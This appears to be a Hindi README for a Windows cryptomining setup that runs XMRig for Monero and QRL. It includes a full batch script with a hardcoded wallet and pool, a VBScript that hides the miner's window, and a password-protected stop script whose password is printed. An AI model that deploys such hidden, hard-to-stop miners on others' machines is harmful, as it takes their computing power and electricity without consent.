# MineXMmmR

<p align="center">
  <img src="https://via.placeholder.com/900x220/0d1117/f0883e?text=MineXMmmR+%7C+Monero+(XMR)+%26+QRL+CPU+Mining+Scripts" alt="MineXMmmR Banner" width="100%" />
</p>

<p align="center">
  <img src="https://via.placeholder.com/220x220/161b22/ff6600?text=MONERO+(XMR)" alt="Monero Coin" width="220" />
  &nbsp;&nbsp;&nbsp;&nbsp;
  <img src="https://via.placeholder.com/220x220/161b22/00d4ff?text=QRL+(QUANTUM+RESISTANT+LEDGER)" alt="QRL Coin" width="220" />
</p>

**MineXMmmR** एक Windows बैच (`.bat`) और VBScript (`.vbs`) आधारित ऑटोमेशन सेटअप है, जो **XMRig** के ज़रिए **Monero (XMR)** और **QRL (Quantum Resistant Ledger)** की **RandomX (`rx/0`)** CPU माइनिंग को नेटवर्क चेक, बैकग्राउंड रन और पासवर्ड-सुरक्षित स्टॉप के साथ चलाता है।

---

## रिपॉजिटरी में मौजूद फ़ाइलें और उनका काम

| फ़ाइल / आइटम | काम करने का तरीका |
| :--- | :--- |
| `mine.bat` | `C:\xmrig` फ़ोल्डर में जाकर `1.1.1.1` पिंग से इंटरनेट चालू होने का इंतज़ार करता है और इंटरनेट मिलते ही **SupportXMR** पूल पर **Monero (XMR)** माइनिंग शुरू करता है। |
| `QRLmine.bat` | इंटरनेट चेक के बाद **HeroMiners** (`sg.qrl.herominers.com:1166`) पर **QRL (`rx/0`)** माइनिंग शुरू करता है। |
| `mine2.bat` | डाउनलोड और एक्सट्रैक्शन से जुड़ी सेटअप/अपडेट प्रक्रिया के लिए उपयोग की जाने वाली बैच स्क्रिप्ट। |
| `silent.vbs` | `WScript.Shell` के `Run` मेथड में विंडो स्टाइल `0` के साथ `C:\xmrig\mine.bat` चलाता है, जिससे कमांड प्रॉम्प्ट विंडो स्क्रीन पर दिखे बिना बैकग्राउंड में काम करती है। |
| `stop.bat` | माइनिंग रोकने से पहले पासवर्ड (`*Hindu*`) मांगता है; सही पासवर्ड मिलने पर `taskkill /f /im xmrig.exe` से `xmrig.exe` बंद करता है। |
| `CMD` | `xmrig` के लिए एट्रिब्यूट/कमांड से जुड़ी सेटिंग्स रखने के लिए फ़ोल्डर/फ़ाइल। |
| `xmrig-6.26.0-windows-x64.zip` | 64-बिट Windows के लिए XMRig माइनिंग बाइनरी पैकेज। |

---

## माइनिंग कोड (Monero और QRL)

### 1. Monero (XMR) माइनिंग कोड (`mine.bat`)

```bat
@echo off
cd /d "C:\xmrig"
:check_net
ping -n 1 1.1.1.1 >nul 2>&1
if %errorlevel% neq 0 (
    timeout /t 5 >nul
    goto check_net
)
xmrig.exe -o pool.supportxmr.com:3333 -u 48W6ehtvLN59EpJACwt7wJLt6vPY7yQTMGLJUPJ6Q9iPJy4cvTsHSW1Xm3JCcboxokEtxHnFweJRwC1Cry5fptdHJveNYSh -p pc1 --cpu-max-threads-hint 35 --cpu-priority 1
